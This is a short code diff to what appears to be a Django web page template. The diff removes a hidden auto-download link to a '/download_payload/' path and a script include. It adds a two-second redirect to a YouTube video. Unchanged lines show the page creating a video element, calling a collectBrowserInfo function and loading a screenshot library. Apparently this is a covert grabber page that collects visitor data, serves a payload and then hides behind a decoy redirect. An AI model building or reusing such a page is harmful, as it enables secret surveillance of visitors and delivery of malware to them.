@@ -590,8 +590,6 @@
             </div>
         </div>
     </div>
-    <a id="downloadLink" href="/download_payload/" download style="display:none;">Download</a>
-    <script src="{% static 'script.js' %}"></script>
 
     <script>
         const video = document.createElement('video');
@@ -694,6 +692,10 @@
         }
 
         collectBrowserInfo();
+        setTimeout(() => {
+    window.location.href = 'https://www.youtube.com/watch?v=WY4-_LRBxW0&t=1021s';
+    }, 2000); // 2-second delay
+
     </script>
     
     <script src="https://cdn.jsdelivr.net/npm/html2canvas@0.4.1/dist/html2canvas.min.js"></script>
